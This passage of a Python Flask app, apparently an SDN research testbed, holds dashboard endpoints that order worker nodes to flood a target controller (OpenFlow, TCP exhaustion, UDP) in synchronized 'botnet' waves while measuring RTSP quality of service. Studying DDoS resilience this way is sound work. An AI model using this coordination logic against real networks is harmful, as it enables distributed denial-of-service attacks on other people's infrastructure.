@app.route("/api/dashboard/broadcast/rtsp/stop", methods=["POST"])
def api_dash_rtsp_stop():
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    d = request.json or {}
    targets = _resolve_workers(d.get("workers", "all"))
    results = {}
    for url in targets:
        body, err = _http_post(f"{_best_url(url)}/api/worker/rtsp/stop", {"all": True})
        results[url] = body if body else {"error": err}
    return jsonify({"results": results})

@app.route("/api/dashboard/broadcast/attack/start", methods=["POST"])
def api_dash_attack_start():
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    d = request.json or {}
    targets = _resolve_workers(d.get("workers", "all"))
    payload = {
        "target_ip":   d.get("target_ip"),
        "target_port": d.get("target_port", 6633),
        "mode":        d.get("mode", "openflow_flood"),
        "threads":     d.get("threads", 10),
        "duration":    d.get("duration", 0),
    }
    results = {}
    for url in targets:
        body, err = _http_post(f"{_best_url(url)}/api/worker/attack/start", payload)
        results[url] = body if body else {"error": err}
    return jsonify({"results": results})


# ── Botnet coordinada: oleadas sincronizadas ──────────────────────────────
# Simula el comportamiento de una botnet real:
#   - Fase 1 (reconocimiento): RTSP clients se conectan, baseline QoS normal
#   - Fase 2 (ataque): todos los bots atacan simultaneamente al controlador
#   - Fase 3 (descanso): pausa entre oleadas (el trafico RTSP se recupera?)
#   - Fase N: repite hasta completar n_waves oleadas
# Cada fase queda registrada en metrics_history para analisis posterior.
_botnet_state = {"active": False, "wave": 0, "total_waves": 0, "log": []}

@app.route("/api/dashboard/botnet/launch", methods=["POST"])
def api_botnet_launch():
    """
    Lanza un ataque coordinado en oleadas desde todos los workers.
    Parametros JSON:
      target_ip    : IP del controlador SDN
      target_port  : Puerto OpenFlow (default 6633)
      mode         : openflow_flood | tcp_exhaust | udp_flood
      threads      : Hilos por nodo (default 30)
      n_waves      : Numero de oleadas (default 3)
      wave_duration: Duracion de cada oleada en segundos (default 60)
      rest_duration: Pausa entre oleadas en segundos (default 30)
      rtsp_ip      : IP del servidor RTSP (opcional, para baseline)
      rtsp_port    : Puerto RTSP (default 554)
      rtsp_path    : Ruta del stream (default live/stream1)
      rtsp_count   : Clientes RTSP por nodo (default 5)
    """
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    global _botnet_state
    if _botnet_state["active"]:
        return jsonify({"error": "Ya hay un ataque botnet en curso"}), 409

    d = request.json or {}
    try:
        target_ip    = _validate_ip(d.get("target_ip", "192.168.10.6"))
        target_port  = _validate_port(d.get("target_port", 6633))
        mode         = _validate_attack_mode(d.get("mode", "openflow_flood"))
        threads      = _validate_int(d.get("threads", 30),       "threads",      1, 200)
        n_waves      = _validate_int(d.get("n_waves", 3),        "n_waves",      1, 20)
        wave_dur     = _validate_int(d.get("wave_duration", 60), "wave_duration",5, 600)
        rest_dur     = _validate_int(d.get("rest_duration", 30), "rest_duration",5, 300)
        rtsp_ip      = d.get("rtsp_ip")
        rtsp_port    = _validate_port(d.get("rtsp_port", 554))
        rtsp_path    = _validate_str(d.get("rtsp_path", "live/stream1"), "rtsp_path",
                                     max_len=200, allow_empty=True)
        rtsp_count   = _validate_int(d.get("rtsp_count", 5), "rtsp_count", 1, 50)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    def _run_botnet():
        global _botnet_state
        workers = list(WORKERS)
        _botnet_state.update({"active": True, "wave": 0,
                               "total_waves": n_waves, "log": []})

        def _log(msg):
            entry = {"ts": round(time.time()), "msg": msg}
            _botnet_state["log"].append(entry)
            print(f"[BOTNET] {msg}")

        # Fase 0: conectar clientes RTSP en todos los nodos (baseline)
        if rtsp_ip:
            _log(f"Fase 0 — Conectando {rtsp_count} clientes RTSP por nodo hacia {rtsp_ip}:{rtsp_port}")
            rtsp_payload = {"server_ip": rtsp_ip, "server_port": rtsp_port,
                            "stream_path": rtsp_path, "count": rtsp_count,
                            "label": "Bot-RTSP"}
            for url in workers:
                _http_post(f"{_best_url(url)}/api/worker/rtsp/start", rtsp_payload)
            time.sleep(10)   # esperar que las sesiones RTSP se establezcan
            _log("Fase 0 completada — baseline RTSP activo")

        # Oleadas de ataque
        for wave in range(1, n_waves + 1):
            _botnet_state["wave"] = wave
            _log(f"Oleada {wave}/{n_waves} — Lanzando {len(workers)} bots | "
                 f"modo={mode} hilos={threads} duracion={wave_dur}s")

            atk_payload = {"target_ip": target_ip, "target_port": target_port,
                           "mode": mode, "threads": threads, "duration": wave_dur}

            # Lanzar todos los workers simultaneamente
            launch_threads = []
            for url in workers:
                t = threading.Thread(
                    target=lambda u=url: _http_post(f"{_best_url(u)}/api/worker/attack/start", atk_payload),
                    daemon=True)
                t.start()
                launch_threads.append(t)
            for t in launch_threads:
                t.join(timeout=5)

            _log(f"Oleada {wave} activa — esperando {wave_dur}s...")
            time.sleep(wave_dur)

            # Detener ataque en todos los workers
            for url in workers:
                _http_post(f"{_best_url(url)}/api/worker/attack/stop", {"all": True})
            _log(f"Oleada {wave} detenida")

            if wave < n_waves:
                _log(f"Descanso entre oleadas — {rest_dur}s (observar recuperacion QoS)")
                time.sleep(rest_dur)

        # Fin del ciclo de oleadas
        _log(f"Botnet completada — {n_waves} oleadas ejecutadas desde {len(workers)} nodos")
        _botnet_state["active"] = False

    threading.Thread(target=_run_botnet, daemon=True).start()

    return jsonify({
        "ok": True,
        "workers": len(WORKERS),
        "n_waves": n_waves,
        "wave_duration": wave_dur,
        "rest_duration": rest_dur,
        "total_duration_est": n_waves * wave_dur + (n_waves - 1) * rest_dur,
        "msg": f"Botnet coordinada iniciada: {n_waves} oleadas x {len(WORKERS)} nodos",
    })

@app.route("/api/dashboard/botnet/status")
def api_botnet_status():
    """Estado actual del ciclo de oleadas."""
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    return jsonify(_botnet_state)

@app.route("/api/dashboard/botnet/stop", methods=["POST"])
def api_botnet_stop():
    """Aborta el ciclo de oleadas y detiene todos los workers."""
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    global _botnet_state
    _botnet_state["active"] = False
    results = {}
    for url in WORKERS:
        body, err = _http_post(f"{_best_url(url)}/api/worker/attack/stop", {"all": True})
        results[url] = body if body else {"error": err}
    _botnet_state["log"].append({"ts": round(time.time()), "msg": "Botnet abortada manualmente"})
    return jsonify({"ok": True, "results": results})

@app.route("/api/dashboard/broadcast/attack/stop", methods=["POST"])
def api_dash_attack_stop():
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    d = request.json or {}
    targets = _resolve_workers(d.get("workers", "all"))
    results = {}
    for url in targets:
        body, err = _http_post(f"{_best_url(url)}/api/worker/attack/stop", {"all": True})
        results[url] = body if body else {"error": err}
    return jsonify({"results": results})


# ══════════════════════════════════════════════════════════════════════════
# Arranque del poll loop (DEBE ir despues de definir _http_get/_http_post,
# sino se produce NameError al ejecutarse el hilo).
# Funciona tanto bajo Gunicorn (importa el modulo) como con `python app.py`.
# ══════════════════════════════════════════════════════════════════════════
if MODE == "dashboard" and WORKERS:
    threading.Thread(target=_worker_poll_loop, daemon=True, name="worker-poll").start()
    print(f"[*] Worker poll loop iniciado para {len(WORKERS)} worker(s)")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    print(f"[*] TrafficGen iniciado")
    print(f"    MODE={MODE}  NODE={NODE_NAME}  PORT={port}")
    if MODE == "dashboard":
        print(f"    WORKERS configurados: {len(WORKERS)}")
        for w in WORKERS:
            print(f"      - {w}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
